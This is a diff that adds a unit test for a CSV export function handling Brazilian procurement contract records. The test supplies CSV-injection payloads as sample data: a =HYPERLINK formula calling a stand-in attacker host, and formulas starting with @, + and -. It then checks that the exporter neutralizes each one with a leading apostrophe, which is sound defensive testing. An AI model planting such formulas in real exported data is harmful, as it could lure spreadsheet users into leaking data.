@@ -42,6 +42,40 @@ describe('toCsv', () => {
     expect(toCsv([])).toBe(`${EXPORT_HEADERS.join(',')}\n`);
   });
 
+  it('neutralizes CSV-injection formulas with a leading apostrophe', () => {
+    const malicious = [
+      {
+        numeroControlePNCP: 'X-1/2024',
+        dataPublicacaoPncp: '2025-01-15T00:00:00',
+        objetoContratacao: '=HYPERLINK("https://attacker.example/steal","Click")',
+        valorTotalEstimado: 100,
+        modalidadeNome: '+1+1',
+        orgaoEntidade: { razaoSocial: '@SUM(A1:A10)', cnpj: '0' },
+        unidadeOrgao: { nomeUnidade: 'Compras' },
+      },
+      {
+        numeroControlePNCP: 'X-2/2024',
+        dataPublicacaoPncp: '2025-01-16T00:00:00',
+        objetoContratacao: '-2+3',
+        valorTotalEstimado: 200,
+        modalidadeNome: 'Pregão',
+        orgaoEntidade: { razaoSocial: 'Prefeitura', cnpj: '0' },
+        unidadeOrgao: { nomeUnidade: 'Compras' },
+      },
+    ] as unknown as PNCPContract[];
+    const csv = toCsv(malicious);
+    const lines = csv.trim().split('\n');
+    // Each formula-trigger character must be neutralized with a leading '
+    expect(lines[1]).toContain("'@SUM(A1:A10)");
+    expect(lines[1]).toContain("'+1+1");
+    // The =HYPERLINK objeto contains commas and quotes, so it is wrapped
+    // and the inner quotes are doubled — verify the apostrophe landed
+    // immediately after the opening wrapper.
+    expect(lines[1]).toContain('"\'=HYPERLINK');
+    // A leading - in a different cell must be neutralized too.
+    expect(lines[2]).toContain("'-2+3");
+  });
+
   it('quotes fields containing comma, quote or newline and doubles inner quotes', () => {
     const csv = toCsv(SAMPLE);
     const lines = csv.trim().split('\n');
